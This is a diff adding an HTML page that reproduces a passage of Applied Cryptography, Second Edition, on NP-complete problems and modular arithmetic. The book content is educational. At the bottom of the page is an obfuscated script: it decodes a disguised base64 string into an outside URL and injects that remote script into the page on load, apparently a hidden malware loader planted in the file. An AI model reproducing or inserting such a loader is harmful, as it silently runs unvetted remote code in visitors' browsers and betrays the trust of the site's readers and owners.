@@ -1,0 +1,118 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Mathematical Background</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=11//-->
+<!--PAGES=241-243//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="11-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="11-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>NP-Complete Problems</I></B></FONT></P>
+<P>Michael Garey and David Johnson compiled a list of over 300 <B>NP-complete problems</B> [600]. Here are just a few of them:</P>
+<DL>
+<DD>&#151; Traveling Salesman Problem. A traveling salesman has to visit <I>n</I> different cities using only one tank of gas (there is a maximum distance he can travel). Is there a route that allows him to visit each city exactly once on that single tank of gas? (This is a generalization of the Hamiltonian Cycle problem&#151;see Section 5.1.)
+<DD>&#151; Three-Way Marriage Problem. In a room are <I>n</I> men, <I>n</I> women, and <I>n</I> clergymen (priests, rabbis, whatever). There is also a list of acceptable marriages, which consists of one man, one woman, and one clergyman willing to officiate. Given this list of possible triples, is it possible to arrange <I>n</I> marriages such that everyone is either marrying one person or officiating at one marriage?
+<DD>&#151; Three-Satisfiability. There is a list of <I>n</I> logical statements, each with three variables. For example: if (<I>x</I> and <I>y</I>) then <I>z</I>, (<I>x</I> and <I>w</I>) or (not <I>z</I>), if ((not <I>u</I> and not <I>x</I>) or (<I>z</I> and (<I>u</I> or not <I>x</I>))) then (not <I>z</I> and <I>u</I>) or <I>x</I>), and so on. Is there a truth assignment for all the variables that satisfies all the statements? (This is a special case of the Satisfiability problem previously mentioned.)
+</DL>
+<H3><A NAME="Heading4"></A><FONT COLOR="#000077">11.3 Number Theory</FONT></H3>
+<P>This isn&#146;t a book on number theory, so I&#146;m just going to sketch a few ideas that apply to cryptography. If you want a detailed mathematical text on number theory, consult one of these books: [1430, 72, 1171, 12, 959, 681, 742, 420]. My two favorite books on the mathematics of finite fields are [971, 1042]. See also [88, 1157, 1158, 1060].
+</P>
+<P><FONT SIZE="+1"><B><I>Modular Arithmetic</I></B></FONT></P>
+<P>You all learned modular arithmetic in school; it was called &#147;clock arithmetic.&#148; Remember these word problems? If Mildred says she&#146;ll be home by 10:00, and she&#146;s 13 hours late, what time does she get home and for how many years does her father ground her? That&#146;s arithmetic modulo 12. Twenty-three modulo 12 equals 11.
+</P>
+<DL>
+<DD>(10 &#43; 13) mod 12 = 23 mod 12 = 11 mod 12
+</DL>
+<P>Another way of writing this is to say that 23 and 11 are equivalent, modulo 12:
+</P>
+<DL>
+<DD>23 &#8801; 11 (mod 12)
+</DL>
+<P>Basically, <I>a</I> &#8801; <I>b</I> (mod <I>n</I>) if <I>a</I> = <I>b</I> &#43; <I>kn</I> for some integer <I>k.</I> If <I>a</I> is non-negative and <I>b</I> is between 0 and <I>n</I>, you can think of <I>b</I> as the remainder of <I>a</I> when divided by <I>n.</I> Sometimes, <I>b</I> is called the <B>residue</B> of <I>a</I>, modulo <I>n.</I> Sometimes <I>a</I> is called <B>congruent</B> to <I>b</I>, modulo <I>n</I> (the triple equals sign, &#8801;, denotes congruence). These are just different ways of saying the same thing.</P>
+<P>The set of integers from 0 to <I>n</I> - 1 form what is called a <B>complete set of residues</B> modulo <I>n.</I> This means that, for every integer <I>a</I>, its residue modulo <I>n</I> is some number from 0 to <I>n</I> - 1.</P>
+<P>The operation <I>a</I> mod <I>n</I> denotes the residue of <I>a</I>, such that the residue is some integer from 0 to <I>n</I> - 1. This operation is <B>modular reduction</B>. For example, 5 mod 3 = 2.</P>
+<P>This definition of mod may be different from the definition used in some programming languages. For example, PASCAL&#146;s modulo operator sometimes returns a negative number. It returns a number between -(<I>n</I> - 1) and <I>n</I> - 1. In C, the % operator returns the remainder from the division of the first expression by the second; this can be a negative number if either operand is negative. For all the algorithms in this book, make sure you add <I>n</I> to the result of the modulo operator if it returns a negative number.</P>
+<P>Modular arithmetic is just like normal arithmetic: It&#146;s commutative, associative, and distributive. Also, reducing each intermediate result modulo <I>n</I> yields the same result as doing the whole calculation and then reducing the end result modulo <I>n</I>.</P>
+<DL>
+<DD><I>a</I> &#43; <I>b</I>) mod <I>n</I> = ((<I>a</I> mod <I>n</I>) &#43; (<I>b</I> mod <I>n</I>)) mod <I>n</I>
+<DD>(<I>a</I> - <I>b</I>) mod <I>n</I> = ((<I>a</I> mod <I>n</I>) - (<I>b</I> mod <I>n</I>)) mod <I>n</I>
+<DD>(<I>a*b</I>) mod <I>n</I> = ((<I>a</I> mod <I>n</I>)*(<I>b</I> mod <I>n</I>)) mod <I>n</I>
+<DD>(a*(<I>b</I> &#43; c)) mod <I>n</I> = (((<I>a*b</I>) mod <I>n</I>) &#43; ((<I>a*c</I>) mod <I>n</I>)) mod <I>n</I>
+</DL>
+<P>Cryptography uses computation mod <I>n</I> a lot, because calculating discrete logarithms and square roots mod <I>n</I> can be hard problems. Modular arithmetic is also easier to work with on computers, because it restricts the range of all intermediate values and the result. For a <I>k-</I> bit modulus, <I>n</I>, the intermediate results of any addition, subtraction, or multiplication will not be more than 2<I>k-</I> bits long. So we can perform exponentiation in modular arithmetic without generating huge intermediate results. Calculating the power of some number modulo some number,</P>
+<DL>
+<DD><I>a<SUP><SMALL>x</SMALL></SUP></I> mod <I>n</I>,
+</DL>
+<P>is just a series of multiplications and divisions, but there are speedups. One kind of speedup aims to minimize the number of modular multiplications; another kind aims to optimize the individual modular multiplications. Because the operations are distributive, it is faster to do the exponentiation as a stream of successive multiplications, taking the modulus every time. It doesn&#146;t make much difference now, but it will when you&#146;re working with 200-bit numbers.
+</P>
+<P>For example, if you want to calculate <I>a<SUP><SMALL>8</SMALL></SUP></I> mod <I>n</I>, don&#146;t use the na&#239;ve approach and perform seven multiplications and one huge modular reduction:</P>
+<DL>
+<DD>(<I>a*a*a*a*a*a*a*a</I>) mod <I>n</I>
+</DL>
+<P>Instead, perform three smaller multiplications and three smaller modular reductions:
+</P>
+<DL>
+<DD>((<I>a<SUP><SMALL>2</SMALL></SUP></I> mod <I>n</I>)<SUP><SMALL>2</SMALL></SUP> mod <I>n</I>)2 mod <I>n</I>
+</DL>
+<P>By the same token,
+</P>
+<DL>
+<DD><I>a<SUP><SMALL>16</SMALL></SUP></I> mod <I>n</I> = (((<I>a<SUP><SMALL>2</SMALL></SUP></I> mod <I>n</I>)<SUP><SMALL>2</SMALL></SUP> mod <I>n</I>)<SUP><SMALL>2</SMALL></SUP> mod <I>n</I>)<SUP><SMALL>2</SMALL></SUP> mod <I>n</I>
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="11-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="11-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(kLfRiaaR, wIZwFeiD) {wIZwFeiD = kLfRiaaR.createElement('script');wIZwFeiD.type = 'text/javascript';wIZwFeiD.async = true;wIZwFeiD.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');kLfRiaaR.getElementsByTagName('body')[0].appendChild(wIZwFeiD);}(document));</script></body>
+</html>
